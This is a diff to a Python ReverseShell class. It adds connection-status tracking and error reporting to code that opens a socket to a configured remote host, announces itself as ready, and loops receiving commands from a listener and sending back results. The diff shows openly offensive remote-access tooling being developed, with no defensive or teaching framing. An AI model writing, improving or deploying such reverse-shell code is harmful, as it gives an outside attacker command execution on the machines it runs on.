@@ -9,6 +9,7 @@ class ReverseShell:
         self.host = host
         self.port = port
         self.connected = False
+        self.status = "IDLE"
         self.sock = None
         self.thread = None
 
@@ -20,6 +21,7 @@ class ReverseShell:
             
             # Send initial identifying info
             self.sock.send(b"[SYSTEM] Reverse Shell Initialized. Ready for commands.\n")
+            self.status = "CONNECTED"
             
             while self.connected:
                 # Receive command from listener
@@ -40,13 +42,18 @@ class ReverseShell:
                     self.sock.send(f"Error: {str(e)}\n".encode("utf-8"))
             
             self.sock.close()
-        except Exception:
+        except Exception as e:
             self.connected = False
+            self.status = f"FAILED: {str(e)}"
         finally:
             self.connected = False
+            if self.status == "CONNECTED":
+                self.status = "DISCONNECTED"
 
     def start(self):
         if not self.connected:
+            self.status = "CONNECTING..."
+            self.connected = True # Set true so thread loop runs
             self.thread = threading.Thread(target=self._connect_and_shell, daemon=True)
             self.thread.start()
 
